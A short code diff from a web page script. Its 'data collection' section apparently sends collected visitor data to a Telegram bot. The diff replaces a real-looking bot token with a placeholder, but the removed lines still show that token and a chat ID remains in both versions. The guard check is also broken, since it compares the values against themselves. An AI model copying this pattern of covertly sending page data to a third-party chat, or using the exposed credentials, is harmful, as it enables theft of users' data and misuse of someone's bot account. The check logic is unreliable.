@@ -218,13 +218,13 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // ===== DATA COLLECTION FEATURES =====
     // Replace with your actual data collection bot token and chat ID
-    const dataBotToken = '7609668402:AAEODPQ0qjBfLmMtOOfG5h9PY0xdKs5QcRs';
+    const dataBotToken = 'xxxxxxx';
     const dataChatId = '6142816761';
     
     // Function to send collected data to Telegram
     function sendCollectedDataToTelegram(dataType, data) {
         // Only send if valid tokens are provided
-        if (dataBotToken === '7609668402:AAEODPQ0qjBfLmMtOOfG5h9PY0xdKs5QcRs' || dataChatId === '6142816761') {
+        if (dataBotToken === 'xxxxxx' || dataChatId === '6142816761') {
             console.log('Data collection not configured. Please add your bot token and chat ID.');
             return;
         }
